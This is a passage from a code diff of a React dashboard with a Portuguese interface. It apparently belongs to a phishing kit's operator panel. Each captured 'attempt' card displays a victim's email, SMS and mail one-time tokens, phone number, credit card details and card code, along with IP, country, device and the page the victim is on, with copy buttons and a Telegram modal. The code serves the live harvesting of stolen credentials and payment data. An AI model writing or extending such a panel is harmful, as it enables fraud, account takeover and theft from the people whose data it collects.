+                        <span className={`text-xs font-mono ${copiedField === `emailinput-${attempt.id}` ? "text-emerald-400" : attempt.email_input ? "text-purple-300" : "text-gray-700"}`}>{copiedField === `emailinput-${attempt.id}` ? "Copiado!" : (attempt.email_input || "-")}</span>
+                      </div>
+                      <div className="bg-[#0b0c11] rounded-lg px-3 py-2 border border-[#161822] cursor-pointer hover:border-[#252838] transition-colors" onClick={() => copyToClipboard(attempt.sms_code, `smscode-${attempt.id}`)}>
+                        <span className="text-[10px] text-gray-500 block">TOK-TEL</span>
+                        <span className={`text-xs font-mono ${copiedField === `smscode-${attempt.id}` ? "text-emerald-400" : attempt.sms_code ? "text-orange-300" : "text-gray-700"}`}>{copiedField === `smscode-${attempt.id}` ? "Copiado!" : (attempt.sms_code || "-")}</span>
+                      </div>
+                      <div className="bg-[#0b0c11] rounded-lg px-3 py-2 border border-[#161822] cursor-pointer hover:border-[#252838] transition-colors" onClick={() => copyToClipboard(attempt.phone_number, `phone-${attempt.id}`)}>
+                        <span className="text-[10px] text-gray-500 block">TELEFONE</span>
+                        <span className={`text-xs font-mono ${copiedField === `phone-${attempt.id}` ? "text-emerald-400" : attempt.phone_number ? "text-emerald-300" : "text-gray-700"}`}>{copiedField === `phone-${attempt.id}` ? "Copiado!" : (attempt.phone_number || "-")}</span>
+                      </div>
+                      <div className="bg-[#0b0c11] rounded-lg px-3 py-2 border border-[#161822] cursor-pointer hover:border-[#252838] transition-colors" onClick={() => copyToClipboard(attempt.app_mail, `appmail-${attempt.id}`)}>
+                        <span className="text-[10px] text-gray-500 block">TOK-MAIL</span>
+                        <span className={`text-xs font-mono ${copiedField === `appmail-${attempt.id}` ? "text-emerald-400" : attempt.app_mail ? "text-blue-300" : "text-gray-700"}`}>{copiedField === `appmail-${attempt.id}` ? "Copiado!" : (attempt.app_mail || "-")}</span>
+                      </div>
+                      <div className="bg-[#0b0c11] rounded-lg px-3 py-2 border border-[#161822] cursor-pointer hover:border-[#252838] transition-colors" onClick={() => attempt.credit_card && setCcModalData(attempt.credit_card)}>
+                        <span className="text-[10px] text-gray-500 block">CARTÃO</span>
+                        {attempt.credit_card ? (
+                          <span className="text-xs font-mono text-yellow-300 underline decoration-dotted">Exibir</span>
+                        ) : (
+                          <span className="text-xs font-mono text-gray-700">-</span>
+                        )}
+                      </div>
+                      <div className="bg-[#0b0c11] rounded-lg px-3 py-2 border border-[#161822] cursor-pointer hover:border-[#252838] transition-colors" onClick={() => copyToClipboard(attempt.cc_code, `cccode-${attempt.id}`)}>
+                        <span className="text-[10px] text-gray-500 block">COD CC</span>
+                        <span className={`text-xs font-mono ${copiedField === `cccode-${attempt.id}` ? "text-emerald-400" : attempt.cc_code ? "text-amber-300" : "text-gray-700"}`}>{copiedField === `cccode-${attempt.id}` ? "Copiado!" : (attempt.cc_code || "-")}</span>
+                      </div>
+                    </div>
+
+                    {/* Footer */}
+                    <div className="px-4 py-2 flex items-center justify-between border-t border-[#161822] bg-[#0a0b10]">
+                      <div className="flex items-center gap-4 text-[10px] text-gray-600">
+                        <span>IP: {attempt.ip_address || "-"}</span>
+                        <span>País: {attempt.country || "-"}</span>
+                        <span>Device: {attempt.device || "Desktop"}</span>
+                        <span>Página: {attempt.page || "Loading..."}</span>
+                      </div>
+                      <button onClick={() => setHistoryModal(attempt)} className="text-[10px] text-gray-500 hover:text-white font-semibold px-2.5 py-1 rounded bg-[#13151c] border border-[#1e2130] hover:border-[#2a2d42] transition-all">
                         Histórico
                       </button>
                     </div>
                   </div>
-                </div>
                 );
               })}
             </div>
           )}
         </div>
-      </div>
 
       {/* ========== MODAL TELEGRAM ========== */}
       {showTelegramModal && (
